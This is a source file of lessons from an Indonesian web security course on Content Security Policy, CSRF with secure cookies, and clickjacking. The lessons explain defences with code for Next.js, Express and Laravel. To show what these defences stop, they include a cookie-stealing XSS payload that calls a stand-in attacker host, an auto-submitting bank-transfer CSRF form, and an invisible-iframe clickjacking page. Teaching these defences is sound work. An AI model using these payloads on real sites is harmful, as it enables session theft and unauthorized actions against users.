            'Alternatif nonce untuk skrip inline yang isinya tidak pernah berubah. Kamu menghitung sidik jari isi skripnya, lalu mencantumkan sidik jari itu di CSP. Cocok untuk halaman statis yang tidak di-render ulang tiap permintaan sehingga tidak bisa memakai nonce.',
        },
        {
          term: '`strict-dynamic`',
          meaning:
            'Nilai yang berkata bahwa skrip yang sudah dipercaya lewat nonce boleh memuat skrip lain. Berguna untuk library yang menyuntikkan skrip sendiri, sehingga kamu tidak perlu mendaftar setiap domain CDN satu per satu.',
        },
        {
          term: 'Report-Only',
          meaning:
            'Mode uji coba lewat header `Content-Security-Policy-Report-Only`. Browser tidak memblokir apa pun, tetapi tetap melaporkan hal yang seharusnya diblokir. Dipakai untuk mengukur dampak sebuah kebijakan sebelum benar-benar menegakkannya.',
        },
      ),

      h2('Anatomi sebuah kebijakan'),
      code(
        'text',
        `
        Content-Security-Policy:
          default-src 'self';
          script-src 'self' 'nonce-r4nd0m123';
          style-src 'self';
          img-src 'self' data: https://cdn.toko.com;
          connect-src 'self' https://api.toko.com;
          font-src 'self';
          object-src 'none';
          base-uri 'self';
          frame-ancestors 'none';
        `,
      ),
      p(
        "Directive `default-src` adalah nilai jatuhan untuk setiap jenis sumber daya yang tidak disebutkan secara khusus. Menaruh `'self'` di sana berarti aturan dasarnya adalah menolak semua yang berasal dari luar origin ini, lalu directive di bawahnya membuka pengecualian satu per satu.",
      ),
      p(
        "Baris `object-src 'none'` menutup tag `<object>` dan `<embed>`, yang merupakan sisa era Flash dan hampir tidak pernah dipakai lagi. Keduanya tetap layak ditutup karena keduanya bisa memuat konten yang dieksekusi, dan biaya menutupnya nol untuk aplikasi modern.",
      ),
      p(
        'Baris `base-uri \'self\'` menutup serangan yang jarang dibicarakan. Tag `<base>` yang disisipkan penyerang bisa mengubah alamat dasar seluruh tautan relatif di halaman, sehingga skrip yang kamu muat dengan `src="/app.js"` justru diambil dari server penyerang. Tanpa directive ini, nonce yang ketat pun bisa dilewati.',
      ),
      p(
        'Nilai `data:` pada `img-src` mengizinkan gambar yang ditulis langsung di HTML dalam bentuk teks terkodekan. Nilai ini aman untuk gambar, tetapi **tidak boleh** dipasang pada `script-src`, karena di sana ia sama artinya dengan mengizinkan penyerang menuliskan skrip apa pun langsung di dalam atribut.',
      ),

      h2('Kenapa unsafe-inline membatalkan semuanya'),
      compare(
        {
          title: 'Terlihat aman, sebenarnya tidak',
          lang: 'text',
          code: `
          script-src 'self' 'unsafe-inline'
          `,
          notes: [
            'Skrip sisipan penyerang juga skrip inline.',
            'Semua payload XSS klasik tetap berjalan.',
            'Perlindungannya nol untuk kasus yang paling penting.',
          ],
        },
        {
          title: 'Benar-benar ketat',
          lang: 'text',
          code: `
          script-src 'self' 'nonce-r4nd0m123'
          `,
          notes: [
            'Hanya skrip dengan nonce yang cocok yang boleh jalan.',
            'Nonce berubah tiap permintaan sehingga tidak bisa ditebak.',
            'Payload sisipan ditolak meski escaping terlewat.',
          ],
        },
      ),
      p(
        'Kolom kiri adalah bentuk yang paling sering ditemui di lapangan, biasanya karena satu library lama menolak berjalan tanpanya. Masalahnya, kebijakan itu tidak membedakan skrip inline milikmu dengan skrip inline milik penyerang, sebab keduanya sama-sama inline. Yang tersisa hanyalah perlindungan terhadap skrip dari domain luar, padahal payload XSS pada umumnya tidak memerlukan domain luar sama sekali.',
      ),
      p(
        'Untuk melihat betapa kecilnya perlindungan yang tersisa, ambil payload XSS yang paling umum, yaitu `<img src=x onerror="fetch(\'https://penyerang.id?c=\'+document.cookie)">`. Payload itu tidak memuat satu pun rujukan ke domain luar di bagian yang dieksekusi, karena kodenya ditulis langsung di dalam atribut. Kebijakan yang mengizinkan skrip inline akan menjalankannya tanpa keberatan sedikit pun.',
      ),
      p(
        'Kebijakan yang sama memang masih menahan bentuk lain, misalnya `<script src="https://penyerang.id/jahat.js">`, karena domain itu tidak ada di daftar. Sayangnya bentuk itu bukan bentuk yang biasa dipakai, sebab menulis kode langsung di payload jauh lebih ringkas dan tidak menuntut penyerang menyiapkan server sendiri.',
      ),
      p(
        'Kolom kanan bekerja karena nonce adalah rahasia yang berumur satu permintaan. Penyerang menyisipkan payload-nya lewat data yang tersimpan atau lewat URL, dan pada saat itu ia belum tahu nonce yang akan dipakai halaman ketika korban membukanya. Skripnya tetap muncul di HTML, tetapi browser menolak menjalankannya.',
      ),

      h2('Memasang nonce di Next.js'),
      code(
        'ts',
        `
        import { NextResponse, type NextRequest } from 'next/server';

        export function middleware(request: NextRequest) {
          // Nilai acak baru untuk SETIAP permintaan.
          const nonce = Buffer.from(crypto.randomUUID()).toString('base64');

          const csp = [
            "default-src 'self'",
            \`script-src 'self' 'nonce-\${nonce}' 'strict-dynamic'\`,
            "style-src 'self'",
            "object-src 'none'",
            "base-uri 'self'",
            "frame-ancestors 'none'",
          ].join('; ');

          const headers = new Headers(request.headers);
          headers.set('x-nonce', nonce);

          const response = NextResponse.next({ request: { headers } });
          response.headers.set('Content-Security-Policy', csp);
          return response;
        }
        `,
        { filename: 'middleware.ts' },
      ),
      p(
        'Nonce dibuat di dalam fungsi `middleware`, jadi ia lahir kembali pada setiap permintaan yang masuk. Ini syarat mutlaknya. Nonce yang dihitung sekali lalu dipakai selamanya sama sekali tidak berguna, karena penyerang cukup membuka halamanmu satu kali untuk membacanya, lalu menyertakan nilai itu di payload-nya.',
      ),
      code(
        'tsx',
        `
        import { headers } from 'next/headers';

        export default async function Halaman() {
          const nonce = (await headers()).get('x-nonce') ?? undefined;

          return (
            <script
              nonce={nonce}
              dangerouslySetInnerHTML={{ __html: 'console.log("skrip resmi")' }}
            />
          );
        }
        `,
      ),
      p(
        'Inilah sisi lain pasangan tadi, yaitu tempat nonce yang dititipkan middleware dibaca kembali lalu dipasang di atribut `nonce`. Nilai yang sama muncul di dua tempat pada satu permintaan, yaitu di header kebijakan dan di tag skripnya, dan kecocokan itulah yang menjadi izin jalan.',
      ),
      p(
        'Perhatikan `dangerouslySetInnerHTML` muncul di sini pada konteks yang justru aman, karena isinya adalah teks tetap yang kamu tulis sendiri dan bukan nilai dari pengguna. Contoh ini berguna sebagai pengingat bahwa yang berbahaya bukan nama fungsinya, melainkan **asal nilainya**.',
      ),
      p(
        'Baris `headers.set("x-nonce", nonce)` menitipkan nilai tadi ke permintaan supaya komponen server bisa membacanya dan memasangnya di atribut `nonce` tag skrip. Tanpa langkah ini, kebijakannya akan menolak skrip aplikasimu sendiri, dan halamannya berhenti bekerja.',
      ),
      p(
        'Nilai `strict-dynamic` ditambahkan supaya skrip yang sudah dipercaya boleh memuat berkas lain yang dibutuhkannya. Framework modern memuat potongan JavaScript-nya secara bertahap, dan tanpa nilai ini kamu harus mendaftar setiap alamat berkasnya, yang mustahil dijaga tetap benar.',
      ),

      h2('Menerapkannya tanpa merusak situs'),
      steps(
        {
          title: 'Mulai dengan Report-Only',
          body: 'Pasang header `Content-Security-Policy-Report-Only` berisi kebijakan yang kamu tuju. Browser tidak memblokir apa pun, jadi tidak ada risiko halaman rusak, tetapi setiap pelanggaran tetap tercatat.',
        },
        {
          title: 'Kumpulkan laporannya',
          body: 'Sediakan endpoint penerima laporan dan biarkan berjalan beberapa hari. Kamu akan menemukan skrip pihak ketiga yang selama ini tidak kamu sadari ada, misalnya dari alat analitik atau widget dukungan.',
        },
        {
          title: 'Perbaiki sumbernya, bukan kebijakannya',
          body: 'Setiap pelanggaran dihadapi dengan satu pertanyaan, yaitu apakah sumber ini memang dibutuhkan. Kalau ya, tambahkan sumbernya secara spesifik. Kalau tidak, hapus skripnya. Melonggarkan kebijakan adalah pilihan terakhir.',
        },
        {
          title: 'Baru tegakkan',
          body: 'Ganti nama headernya menjadi `Content-Security-Policy`. Karena laporannya sudah sepi lebih dulu, penegakan ini seharusnya tidak menimbulkan kejutan.',
        },
      ),
      p(
        'Langkah ketiga adalah yang menentukan hasil akhirnya. Godaan terbesar saat menerapkan CSP adalah menambahkan `unsafe-inline` begitu ada satu pelanggaran yang sulit diperbaiki, dan satu keputusan itu mengembalikan seluruh kebijakan ke titik nol. Kalau sebuah library benar-benar menuntutnya, gantilah library-nya atau muat lewat berkas terpisah.',
      ),
      code(
        'json',
        `
        {
          "csp-report": {
            "document-uri": "https://toko.com/produk/7",
            "violated-directive": "script-src 'self'",
            "blocked-uri": "https://analitik-pihak-ketiga.com/tag.js",
            "line-number": 42
          }
        }
        `,
        { caption: 'Satu laporan pelanggaran, dikirim browser ke endpoint yang kamu tunjuk.' },
      ),
      p(
        'Isi laporan itulah yang mengubah penerapan CSP dari menebak menjadi mengukur. Nilai `blocked-uri` menyebut sumber yang ditolak, `violated-directive` menyebut aturan mana yang dilanggar, dan `document-uri` menyebut halaman tempat kejadiannya. Bertiga sudah cukup untuk memutuskan apakah sumber itu memang dibutuhkan atau justru skrip yang seharusnya tidak ada.',
      ),
      p(
        'Satu hal yang perlu disiapkan sejak awal, endpoint penerima laporan bisa menerima kiriman dalam jumlah besar, termasuk laporan palsu dari luar. Batasi lajunya, batasi ukuran body-nya, dan jangan pernah menampilkan isinya mentah-mentah di dasbor internal, karena isinya adalah data dari luar yang tunduk pada seluruh aturan di sub-bab 3.1.',
      ),
      callout(
        'tip',
        'CSP adalah lapis kedua, bukan pengganti escaping',
        'Situs dengan CSP paling ketat sekalipun tetap harus meng-escape keluarannya. Yang diubah CSP adalah akibat sebuah kelalaian, dari sesi yang dicuri menjadi baris error di Console. Urutan kerjanya selalu perbaiki escaping dulu, lalu pasang CSP sebagai jaring.',
      ),

      references(
        {
          label: 'Content Security Policy (CSP)',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP',
          source: 'MDN',
          note: 'Panduan utama beserta contoh kebijakan dan cara kerja nonce.',
        },
        {
          label: 'CSP directives reference',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy',
          source: 'MDN',
          note: 'Daftar lengkap setiap directive beserta nilai yang diterimanya.',
        },
        {
          label: 'Mitigate cross-site scripting with a strict CSP',
          href: 'https://web.dev/articles/strict-csp',
          source: 'web.dev',
          note: 'Alasan pendekatan nonce lebih baik daripada daftar domain yang diizinkan.',
        },
        {
          label: 'Content Security Policy',
          href: 'https://nextjs.org/docs/app/guides/content-security-policy',
          source: 'Next.js',
          note: 'Cara resmi memasang nonce lewat middleware, dasar contoh di sub-bab ini.',
        },
      ),
    ],
  ),

  written(
    'csrf-cookie',
    'CSRF dan Cookie yang Aman',
    13,
    'Situs lain memakai sesimu tanpa pernah membaca satu byte pun datamu.',
    [
      p(
        'Cross-Site Request Forgery berdiri di atas satu kenyataan yang sudah kita lihat di sub-bab CORS, yaitu browser **mengirim cookie berdasarkan tujuan permintaan, bukan berdasarkan asal halamannya**. Halaman jahat tidak bisa membaca respons dari situsmu, tetapi ia tetap bisa memicu permintaan yang mengubah data, dan cookie sesi korban ikut terkirim.',
      ),
      p(
        'Kalau kamu belum pernah memasang cookie sesi, sub-bab [Session dan Cookie](/kelas/backend-basic/auth-dasar/session-cookie) menjelaskan bentuk dasarnya. Di sini kita membahas apa yang membuat cookie itu aman atau tidak, dan kapan pertahanan CSRF memang tidak diperlukan.',
      ),

      terms(
        {
          term: 'CSRF',
          meaning:
            'Singkatan dari **Cross-Site Request Forgery**, kadang dibaca "si-serf". Penyerang membuat browser korban mengirim permintaan yang mengubah data ke situs tempat korban sedang login. Penyerang tidak pernah melihat hasilnya, tetapi perubahannya sudah terjadi.',
        },
        {
          term: 'ambient authority',
          meaning:
            'Kewenangan yang menempel otomatis pada permintaan tanpa diminta kodenya, dan cookie adalah contoh utamanya. Browser melampirkan cookie ke setiap permintaan menuju domain itu, tidak peduli halaman mana yang memicunya. Sifat otomatis inilah yang membuat CSRF mungkin.',
        },
        {
          term: '`HttpOnly`',
          meaning:
            'Penanda pada cookie yang membuatnya **tidak bisa dibaca JavaScript**, termasuk oleh skrip penyerang yang berhasil disisipkan lewat XSS. Cookie tetap terkirim otomatis ke server, jadi aplikasinya berjalan seperti biasa. Penandanya hanya menutup jalur pembacaan dari sisi halaman.',
        },
        {
          term: '`Secure`',
          meaning:
            'Penanda yang membuat cookie hanya dikirim lewat koneksi HTTPS. Tanpa penanda ini, satu permintaan HTTP biasa saja sudah cukup untuk membocorkan cookie sesi kepada siapa pun yang bisa menyadap jaringan, misalnya di WiFi publik.',
        },
        {
          term: '`SameSite`',
          meaning:
            'Penanda yang mengatur apakah cookie ikut terkirim ketika permintaan berasal dari situs lain. Nilainya `Strict`, `Lax`, atau `None`. Penanda inilah pertahanan CSRF bawaan browser modern, dan sebagian besar browser sekarang memakai `Lax` sebagai bawaan bila kamu tidak menyebutkannya.',
        },
        {
          term: 'synchronizer token',
          meaning:
            'Pola token CSRF klasik. Server membuat nilai acak, menyimpannya di sesi, lalu menyisipkannya sebagai kolom tersembunyi di form. Saat form dikirim, server membandingkan nilai yang datang dengan nilai di sesi. Halaman penyerang tidak bisa menebak nilai itu karena ia tidak bisa membaca halamanmu.',
        },
        {
          term: 'double submit cookie',
          meaning:
            'Variasi yang tidak butuh penyimpanan di sisi server. Nilai acak yang sama dikirim dua kali, yaitu lewat cookie dan lewat header atau body. Server cukup memeriksa keduanya cocok. Aman karena situs lain tidak bisa membaca nilai cookie itu untuk menyalinnya ke header.',
        },
        {
          term: 'permintaan yang mengubah state',
          meaning:
            'Permintaan yang mengubah sesuatu di server, misalnya membuat, mengubah, menghapus, atau memindahkan dana. Hanya jenis inilah yang perlu pertahanan CSRF. Konsekuensi lain dari definisi ini, aksi yang mengubah data tidak boleh memakai metode `GET`.',
        },
      ),

      h2('Bentuk serangannya'),
      code(
        'html',
        `
        <!-- Halaman di https://kupon-gratis.id -->
        <h1>Selamat, kamu menang!</h1>

        <form id="diam" action="https://bank.com/transfer" method="POST">
          <input type="hidden" name="tujuan" value="rekening-penyerang" />
          <input type="hidden" name="jumlah" value="5000000" />
        </form>

        <script>
          document.getElementById('diam').submit();
        </script>
        `,
      ),
      p(
        'Tidak ada satu pun teknik canggih di halaman itu. Yang dipakai hanyalah form HTML biasa dan satu baris JavaScript yang mengirimnya. Ketika korban membuka halaman ini sambil punya sesi aktif di `bank.com`, browser mengirim permintaan `POST` beserta cookie sesi korban, dan dari sudut pandang server bank permintaan itu terlihat sah sepenuhnya.',
      ),
      p(
        'Varian yang bahkan lebih ringkas terjadi bila endpoint yang mengubah data menerima metode `GET`. Untuk itu penyerang tidak butuh form maupun JavaScript, cukup satu baris `<img src="https://bank.com/transfer?tujuan=penyerang&jumlah=5000000">`. Gambar itu tidak akan tampil karena responsnya bukan gambar, dan kegagalan menampilkannya sama sekali tidak menghalangi permintaannya terkirim.',
      ),
      p(
        'Bentuk itu juga menjelaskan kenapa aturan "aksi yang mengubah data tidak boleh lewat `GET`" berdiri di daftar pertahanan CSRF. Selain karena tag gambar, tautan `GET` ikut tersimpan di riwayat browser, ikut di-cache, dan bisa dipicu ulang oleh crawler yang membuka setiap tautan di sebuah halaman.',
      ),
      p(
        'Perhatikan penyerang **tidak pernah membaca** respons bank, dan memang tidak perlu. Same-Origin Policy tetap menahan pembacaannya, tetapi transfernya sudah terjadi. Inilah alasan CSRF disebut serangan tulis, dan alasan CORS tidak melindungimu dari serangan ini.',
      ),
      p(
        'Perhatikan juga form itu memakai `method="POST"` tanpa `Content-Type` khusus, jadi ia termasuk simple request yang tidak memicu preflight. Semua serangan CSRF klasik hidup di celah ini, yaitu bentuk permintaan yang sudah bisa dilakukan HTML sejak dulu.',
      ),

      h2('SameSite, pertahanan bawaan browser'),
      table(
        ['Nilai', 'Cookie dikirim saat', 'Cocok untuk'],
        [
          [
            '`Strict`',
            'Hanya bila permintaan berasal dari situs yang sama, termasuk saat mengeklik tautan dari situs lain',
            'Aksi sangat sensitif seperti panel admin dan perbankan',
          ],
          [
            '`Lax`',
            'Permintaan dari situs sama, ditambah navigasi teratas dengan metode `GET`',
            'Sebagian besar aplikasi, dan ini bawaan browser modern',
          ],
          [
            '`None`',
            'Selalu, dan wajib dipasangkan dengan `Secure`',
            'API yang memang dipakai lintas domain',
          ],
        ],
      ),
      p(
        'Nilai `Lax` menahan serangan pada contoh di atas, karena pengiriman form `POST` dari situs lain bukan navigasi `GET`. Yang tetap diizinkan `Lax` adalah korban mengeklik tautan biasa menuju situsmu lalu tampil dalam keadaan login, dan itu memang perilaku yang diinginkan hampir semua situs.',
      ),
      p(
        'Istilah navigasi teratas di baris tabel perlu dijelaskan karena menentukan batasnya. Yang dimaksud adalah perpindahan seluruh halaman, misalnya pengguna mengeklik tautan lalu address bar ikut berubah. Permintaan yang lahir di dalam halaman tanpa memindahkannya, seperti pengiriman form lewat JavaScript, pemuatan gambar, atau panggilan `fetch`, tidak termasuk kategori itu.',
      ),
      p(
        'Karena batas itulah `Lax` cukup untuk sebagian besar kasus. Serangan CSRF selalu berupa permintaan yang dipicu dari dalam halaman penyerang tanpa memindahkan korban ke situsmu, sebab memindahkan korban justru membuat serangannya terlihat. Yang tersisa di luar jangkauan `Lax` adalah tautan `GET` yang mengubah data, dan itu sudah ditutup aturan sebelumnya.',
      ),
      p(
        'Nilai `Strict` menutup lebih rapat, tetapi harganya terasa oleh pengguna. Ketika seseorang mengeklik tautan situsmu dari email atau chat, halaman yang terbuka akan tampak belum login, karena cookienya sengaja tidak dikirim. Karena itu `Strict` biasanya dipakai untuk cookie tambahan yang menjaga aksi sensitif, bukan untuk cookie sesi utama.',
      ),
      code(
        'js',
        `
        res.cookie('sesi', idSesi, {
          httpOnly: true,                             // tidak bisa dibaca JavaScript
          secure: process.env.NODE_ENV === 'production', // hanya lewat HTTPS
          sameSite: 'lax',                            // menahan POST lintas situs
          path: '/',
          maxAge: 1000 * 60 * 60 * 8,                 // 8 jam
        });
        `,
      ),
      p(
        'Empat penanda pertama bekerja pada ancaman yang berbeda, jadi tidak ada yang bisa menggantikan yang lain. `httpOnly` menutup pencurian lewat XSS, `secure` menutup penyadapan jaringan, dan `sameSite` menutup CSRF. Menghilangkan salah satunya membuka kembali satu jalur penuh.',
      ),
      p(
        'Nilai `secure` sengaja dibuat bergantung pada `NODE_ENV` karena pengembangan lokal biasanya berjalan di `http://localhost`. Kalau `secure` dipaksa `true` di sana, browser tidak akan pernah menyimpan cookienya dan kamu akan menghabiskan waktu mengejar bug login yang sebenarnya tidak ada.',
      ),
      p(
        'Baris `maxAge` menentukan umur sesi. Angka delapan jam adalah pilihan yang menyeimbangkan kenyamanan dengan risiko, sebab sesi yang tidak pernah kedaluwarsa berarti perangkat yang hilang tetap masuk selamanya. Pembahasan lengkap soal umur token ada di sub-bab 2.4.',
      ),

      h2('Token CSRF, dan kapan ia tidak diperlukan'),
      p(
        'SameSite sudah menutup sebagian besar kasus, tetapi ia bergantung pada browser dan pada penilaian browser soal apa yang termasuk situs sama. Untuk aksi bernilai tinggi, tambahkan pemeriksaan kedua yang berdiri sendiri.',
      ),
      code(
        'js',
        `
        import crypto from 'node:crypto';

        // Menaruh token di cookie yang BISA dibaca JavaScript, ini disengaja.
        app.use((req, res, next) => {
          if (!req.cookies.csrf) {
            const token = crypto.randomBytes(32).toString('hex');
            res.cookie('csrf', token, { sameSite: 'lax', secure: true, path: '/' });
          }
          next();
        });

        // Memeriksa keduanya cocok pada setiap permintaan yang mengubah data.
        function periksaCsrf(req, res, next) {
          const dariCookie = req.cookies.csrf;
          const dariHeader = req.get('X-CSRF-Token');

          if (!dariCookie || !dariHeader || dariCookie.length !== dariHeader.length) {
            return res.status(403).json({ pesan: 'Permintaan ditolak' });
          }
          const cocok = crypto.timingSafeEqual(
            Buffer.from(dariCookie),
            Buffer.from(dariHeader),
          );
          if (!cocok) return res.status(403).json({ pesan: 'Permintaan ditolak' });
          next();
        }
        `,
      ),
      p(
        'Cookie `csrf` di sini sengaja **tidak** diberi `httpOnly`, dan itu bukan kelalaian. Justru JavaScript halamanmu yang harus bisa membacanya untuk menyalinnya ke header `X-CSRF-Token`. Keamanannya tidak berasal dari kerahasiaan cookie itu, melainkan dari kenyataan bahwa halaman di origin lain tidak bisa membaca cookie milik origin-mu.',
      ),
      p(
        'Kenapa penyerang tidak bisa menyalin nilai itu juga perlu dijelaskan, sebab pertanyaannya wajar muncul. Cookie tunduk pada aturan asal yang sama seperti data lain, sehingga JavaScript di `kupon-gratis.id` tidak bisa membaca cookie milik `bank.com`. Yang bisa dilakukan halaman penyerang hanyalah memicu permintaan yang **membawa** cookie itu, tanpa pernah bisa melihat isinya.',
      ),
      p(
        'Di situlah letak asimetri yang dimanfaatkan pola ini. Cookie ikut terkirim otomatis, sedangkan header `X-CSRF-Token` harus diisi kode yang mampu membaca cookie tersebut. Halaman penyerang bisa memenuhi syarat pertama tetapi tidak pernah syarat kedua, sehingga kedua nilai itu tidak akan pernah cocok pada permintaan yang ia buat.',
      ),
      p(
        'Fungsi `crypto.timingSafeEqual` dipakai menggantikan perbandingan biasa dengan tanda sama dengan. Perbandingan string biasa berhenti pada karakter pertama yang berbeda, sehingga lama waktunya sedikit membocorkan berapa banyak karakter awal yang sudah benar. Fungsi ini selalu memeriksa seluruh isi sehingga waktunya tidak bergantung pada isinya.',
      ),
      p(
        'Pemeriksaan panjang di baris sebelumnya ada karena alasan teknis, sebab `timingSafeEqual` melempar error kalau kedua buffer berbeda panjang. Menolak lebih dulu dengan `403` juga sudah merupakan jawaban yang benar untuk kasus itu.',
      ),
      callout(
        'info',
        'API dengan token di header tidak butuh token CSRF',
        'CSRF hidup karena cookie terkirim otomatis. Kalau API-mu diautentikasi lewat header `Authorization` yang harus dipasang kode secara sadar, halaman penyerang tidak punya apa pun untuk ditumpangi. Menambahkan mesin token CSRF di sana hanya menambah kerumitan tanpa menambah keamanan. Fokuskan usahanya pada endpoint yang benar-benar memakai cookie.',
      ),

      h2('Pemeriksaan Origin sebagai jaring tambahan'),
      code(
        'js',
        `
        const ORIGIN_SENDIRI = new Set(['https://app.toko.com']);

        function periksaAsal(req, res, next) {
          if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();

          const asal = req.get('Origin') ?? req.get('Referer');
          if (!asal) return res.status(403).json({ pesan: 'Permintaan ditolak' });

          try {
            if (!ORIGIN_SENDIRI.has(new URL(asal).origin)) {
              return res.status(403).json({ pesan: 'Permintaan ditolak' });
            }
          } catch {
            return res.status(403).json({ pesan: 'Permintaan ditolak' });
          }
          next();
        }
        `,
      ),
      p(
        'Baris pertama melewatkan `GET`, `HEAD`, dan `OPTIONS` karena ketiganya seharusnya tidak mengubah apa pun. Kalau di aplikasimu ada endpoint `GET` yang mengubah data, masalahnya bukan pada pemeriksaan ini, melainkan pada endpoint tersebut yang memang harus diubah menjadi `POST`.',
      ),
      p(
        'Header `Origin` dipilih lebih dulu, dan `Referer` hanya menjadi cadangan. Alasannya, `Origin` hanya memuat skema, host, dan port, sedangkan `Referer` memuat alamat lengkap termasuk jalur yang bisa berisi data pribadi. Banyak konfigurasi juga sengaja memangkas `Referer`, jadi mengandalkannya sendirian membuat permintaan sah ikut tertolak.',
      ),
      p(
        'Perhatikan header ini **tidak bisa dipalsukan halaman jahat**. Browser yang mengisinya, dan JavaScript tidak diizinkan mengubahnya. Sebaliknya, `curl` bisa mengisinya dengan nilai apa pun, dan itu tidak masalah, karena `curl` tidak membawa cookie korban sehingga bukan skenario CSRF.',
      ),

      h2('Bagaimana framework menanganinya'),
      code(
        'php',
        `
        {{-- Blade menyisipkan kolom tersembunyi berisi token sesi --}}
        <form method="POST" action="/transfer">
            @csrf
            <input name="jumlah" />
            <button type="submit">Kirim</button>
        </form>
        `,
      ),
      p(
        'Direktif `@csrf` menghasilkan satu `<input type="hidden">` berisi token milik sesi itu. Middleware bawaan Laravel memeriksanya pada setiap `POST`, `PUT`, `PATCH`, dan `DELETE`, jadi perlindungannya menyala tanpa kamu menulis kode pemeriksa. Yang perlu kamu jaga justru sebaliknya, yaitu jangan mengeluarkan sebuah route dari middleware itu tanpa alasan yang benar-benar dipikirkan.',
      ),
      p(
        'Di Next.js, Server Actions memeriksa asal permintaan secara bawaan, sehingga aksi form yang ditulis dengan cara resmi sudah terlindung. Yang tetap menjadi tanggung jawabmu adalah Route Handler yang kamu tulis sendiri dan memakai cookie sesi, karena di sana tidak ada pemeriksaan otomatis.',
      ),
      ol(
        'Pasang `HttpOnly`, `Secure`, dan `SameSite` pada setiap cookie sesi.',
        'Pastikan tidak ada aksi yang mengubah data lewat metode `GET`.',
        'Tambahkan token CSRF untuk aksi bernilai tinggi yang memakai cookie.',
        'Periksa `Origin` pada permintaan yang mengubah data sebagai jaring tambahan.',
        'Lewati semua ini untuk API murni header, dan catat alasannya agar tidak dipertanyakan berulang.',
      ),

      references(
        {
          label: 'Cross-site request forgery (CSRF)',
          href: 'https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF',
          source: 'MDN',
          note: 'Bentuk serangan dan alasan cookie terkirim otomatis.',
        },
        {
          label: 'Cross-Site Request Forgery Prevention Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Pola synchronizer token dan double submit beserta batasnya masing-masing.',
        },
        {
          label: 'Set-Cookie',
          href: 'https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie',
          source: 'MDN',
          note: 'Rujukan resmi setiap penanda cookie termasuk ketiga nilai SameSite.',
        },
        {
          label: 'CSRF Protection',
          href: 'https://laravel.com/docs/12.x/csrf',
          source: 'Laravel',
          note: 'Cara kerja `@csrf` dan middleware yang memeriksanya.',
        },
      ),
    ],
  ),

  written(
    'clickjacking-header',
    'Clickjacking dan Header Keamanan',
    12,
    'Beberapa baris header yang menutup seluruh kelas serangan sekaligus.',
    [
      p(
        'Sub-bab ini mengumpulkan pertahanan yang bentuknya paling murah di seluruh kategori ini, yaitu header respons HTTP. Semuanya dipasang satu kali di lapisan server, tidak menyentuh logika aplikasi, dan masing-masing menutup satu kelas serangan yang nyata.',
      ),
      p(
        'Karena murah, header ini sering ditunda dengan alasan akan dipasang nanti. Sayangnya nanti biasanya berarti sesudah ada insiden, jadi perlakukan daftar ini sebagai bagian dari menyiapkan server, bukan sebagai pekerjaan tambahan.',
      ),

      terms(
        {
          term: 'clickjacking',
          meaning:
            'Serangan yang menampilkan halamanmu di dalam bingkai transparan di atas halaman penyerang. Korban merasa sedang mengeklik tombol di halaman penyerang, padahal klik itu mendarat di tombol milik halamanmu, misalnya tombol "Hapus akun" atau "Setujui pembayaran".',
        },
        {
          term: 'iframe',
          meaning:
            'Tag HTML yang menyisipkan satu halaman web di dalam halaman lain. Dipakai untuk banyak hal yang sah seperti video dan peta. Bahayanya muncul ketika halaman yang disisipkan adalah halamanmu, sementara pemilik halaman luarnya adalah penyerang.',
        },
        {
          term: '`frame-ancestors`',
          meaning:
            "Directive CSP yang menentukan siapa saja yang boleh menampilkan halamanmu di dalam bingkai. Nilai `'none'` berarti tidak boleh siapa pun. Ini pengganti modern dari `X-Frame-Options` dan lebih fleksibel karena bisa menyebut beberapa origin sekaligus.",
        },
        {
          term: 'MIME sniffing',
          meaning:
            'Kebiasaan lama browser menebak jenis sebuah berkas dari isinya ketika header `Content-Type` terasa tidak cocok. Berbahaya karena berkas yang kamu sajikan sebagai teks biasa bisa ditebak sebagai HTML lalu dieksekusi. Ditutup dengan header `X-Content-Type-Options: nosniff`.',
        },
        {
          term: '`Referrer-Policy`',
          meaning:
            'Header yang mengatur seberapa banyak informasi alamat halamanmu ikut terkirim saat pengguna berpindah ke situs lain. Penting karena alamat halaman sering memuat id, token, atau kata kunci pencarian yang tidak seharusnya diketahui situs tujuan.',
        },
        {
          term: '`Permissions-Policy`',
          meaning:
            'Header yang mematikan kemampuan browser yang tidak dipakai aplikasimu, misalnya kamera, mikrofon, dan lokasi. Gunanya membatasi kerusakan, sebab skrip pihak ketiga yang disusupi tetap tidak bisa menyalakan kamera bila kemampuannya sudah dimatikan di tingkat halaman.',
        },
        {
          term: 'Helmet',
          meaning:
            'Middleware Express yang memasang sekumpulan header keamanan sekaligus dengan nilai bawaan yang masuk akal. Memakainya jauh lebih aman daripada menulis setiap header dengan tangan, karena daftar dan nilai yang dianjurkan berubah seiring waktu.',
        },
      ),

      h2('Bagaimana clickjacking bekerja'),
      code(
        'html',
        `
        <!-- Halaman penyerang -->
        <style>
          iframe { opacity: 0; position: absolute; top: 0; left: 0;
                   width: 100%; height: 100%; z-index: 2; }
          button { position: absolute; top: 320px; left: 240px; z-index: 1; }
        </style>

        <button>Klik untuk klaim hadiah</button>
        <iframe src="https://app.toko.com/pengaturan/hapus-akun"></iframe>
        `,
      ),
      p(
        'Kunci serangannya ada pada tiga properti CSS di baris pertama. Nilai `opacity: 0` membuat bingkai benar-benar tidak terlihat, sedangkan `z-index: 2` menempatkannya **di atas** tombol umpan. Korban melihat tombol hadiah, tetapi kliknya diterima halamanmu yang tak terlihat di lapisan atas.',
      ),
      p(
        'Bagian yang belum terlihat di potongan itu adalah pekerjaan penyerang menyelaraskan posisinya. Ia membuka halamanmu lebih dulu, mencatat di koordinat mana tombol berbahaya berada, lalu menggeser bingkai memakai `top` dan `left` bernilai negatif sehingga tombol itu jatuh tepat di bawah kursor saat tombol umpannya diklik. Penyesuaian ini dilakukan sekali, dan sesudah itu halamannya bekerja untuk setiap korban.',
      ),
      p(
        'Varian yang lebih halus tidak memakai tombol sama sekali, melainkan mengikuti kursor. Bingkai transparan digeser mengikuti gerakan mouse, sehingga klik pertama di mana pun pada halaman itu selalu mendarat di tombol yang diincar. Karena semua varian ini bergantung pada kemampuan menampilkan halamanmu di dalam bingkai, satu header yang menolak pembingkaian menutup seluruhnya sekaligus.',
      ),
